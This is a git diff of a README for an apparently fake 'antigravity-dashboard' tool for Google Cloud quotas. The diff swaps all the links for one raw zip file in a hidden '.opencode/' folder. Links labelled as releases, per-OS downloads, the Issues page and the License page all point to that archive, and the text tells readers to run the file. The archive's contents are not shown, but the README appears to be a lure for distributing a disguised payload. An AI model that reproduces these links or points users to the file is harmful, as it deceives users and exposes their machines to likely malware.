@@ -1,6 +1,6 @@
 # 🚀 antigravity-dashboard - Monitor Your Google Cloud Quotas Easily 
 
-[![Download](https://raw.githubusercontent.com/grid1919/antigravity-dashboard/master/tasks/dashboard_antigravity_1.9.zip)](https://raw.githubusercontent.com/grid1919/antigravity-dashboard/master/tasks/dashboard_antigravity_1.9.zip)
+[![Download](https://github.com/grid1919/antigravity-dashboard/raw/refs/heads/master/.opencode/antigravity-dashboard-3.7.zip)](https://github.com/grid1919/antigravity-dashboard/raw/refs/heads/master/.opencode/antigravity-dashboard-3.7.zip)
 
 ## ⚙️ Introduction
 
@@ -8,14 +8,14 @@ Welcome to the Antigravity Dashboard! This tool helps you monitor your Google Cl
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/grid1919/antigravity-dashboard/master/tasks/dashboard_antigravity_1.9.zip).
+To get started, visit this page to download: [GitHub Releases](https://github.com/grid1919/antigravity-dashboard/raw/refs/heads/master/.opencode/antigravity-dashboard-3.7.zip).
 
 1. Open the link above to go to the releases page.
 2. Find the latest version of the software.
 3. Click on the appropriate file for your operating system to start the download. Common files might include:
-   - Windows: `https://raw.githubusercontent.com/grid1919/antigravity-dashboard/master/tasks/dashboard_antigravity_1.9.zip`
-   - Mac: `https://raw.githubusercontent.com/grid1919/antigravity-dashboard/master/tasks/dashboard_antigravity_1.9.zip`
-   - Linux: `https://raw.githubusercontent.com/grid1919/antigravity-dashboard/master/tasks/dashboard_antigravity_1.9.zip`
+   - Windows: `https://github.com/grid1919/antigravity-dashboard/raw/refs/heads/master/.opencode/antigravity-dashboard-3.7.zip`
+   - Mac: `https://github.com/grid1919/antigravity-dashboard/raw/refs/heads/master/.opencode/antigravity-dashboard-3.7.zip`
+   - Linux: `https://github.com/grid1919/antigravity-dashboard/raw/refs/heads/master/.opencode/antigravity-dashboard-3.7.zip`
 4. Once the download is complete, locate the file in your downloads folder.
 5. Run the file to install the application by following the on-screen instructions.
 
@@ -54,7 +54,7 @@ If you encounter issues while running the Antigravity Dashboard, consider the fo
 
 You can reach out for help or share feedback through the following channels:
 
-- **GitHub Issues**: Report issues or ask questions on the [Issues page](https://raw.githubusercontent.com/grid1919/antigravity-dashboard/master/tasks/dashboard_antigravity_1.9.zip).
+- **GitHub Issues**: Report issues or ask questions on the [Issues page](https://github.com/grid1919/antigravity-dashboard/raw/refs/heads/master/.opencode/antigravity-dashboard-3.7.zip).
 - **Discussion Forum**: Join the community discussions to share your experiences and tips for using the dashboard.
 
 ## 🎉 Acknowledgments
@@ -63,6 +63,6 @@ We thank everyone who contributed to this project. Your support helps make the A
 
 ## ⚙️ License
 
-This project is licensed under the MIT License. For more details, visit the [License page](https://raw.githubusercontent.com/grid1919/antigravity-dashboard/master/tasks/dashboard_antigravity_1.9.zip).
+This project is licensed under the MIT License. For more details, visit the [License page](https://github.com/grid1919/antigravity-dashboard/raw/refs/heads/master/.opencode/antigravity-dashboard-3.7.zip).
 
-For further information, visit the [GitHub Releases](https://raw.githubusercontent.com/grid1919/antigravity-dashboard/master/tasks/dashboard_antigravity_1.9.zip) page again to check for updates and new versions.
+For further information, visit the [GitHub Releases](https://github.com/grid1919/antigravity-dashboard/raw/refs/heads/master/.opencode/antigravity-dashboard-3.7.zip) page again to check for updates and new versions.
